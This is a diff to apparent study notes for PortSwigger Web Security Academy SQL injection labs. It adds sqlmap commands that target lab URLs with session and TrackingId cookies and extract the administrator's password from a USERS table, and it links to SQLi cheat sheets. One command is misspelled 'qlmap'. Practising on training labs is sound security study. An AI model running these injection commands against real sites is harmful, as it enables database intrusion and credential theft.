@@ -1,9 +1,5 @@
 ____
 
-```bash
-sqlmap -u "URL" --cookie='lab=cookie' --level 5 --risk 3 -p param --batch --threads 10 --dbms=postgresql --sql-query="SELECT password from USERS where username='administrator'"
-```
-
 [https://tib3rius.com/sqli](https://tib3rius.com/sqli) 
 
 [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -14,7 +10,15 @@ sqlmap -u "https://0a9100e603500d0982375131006f00bc.web-security-academy.net/fil
 ```
 
 
+```bash
+sqlmap -u "https://0a39002b04d1c3af83dc5ac4006e0063.web-security-academy.net/filter?category=test" --cookie="session=N3QaEz5GFooyaQ4CxomOPoxXWZ7PVdmH" --level 5 --risk 3 -p category --batch --threads 10 --dbms=postgresql -D public --sql-query="SELECT password from USERS where username='administrator'"
+```
 
 
+# TrackingId
+
+```bash
+qlmap -u "https://0aef001c04d61b8e81771771008e0081.web-security-academy.net/filter?category=test" --cookie="TrackingId=YJopvpBsdNu7Eti3" --level 5 --risk 3 -p TrackingId --batch --threads 10 --dbms=postgresql -D public --sql-query="SELECT password from USERS where username='administrator'"
+```
 
 
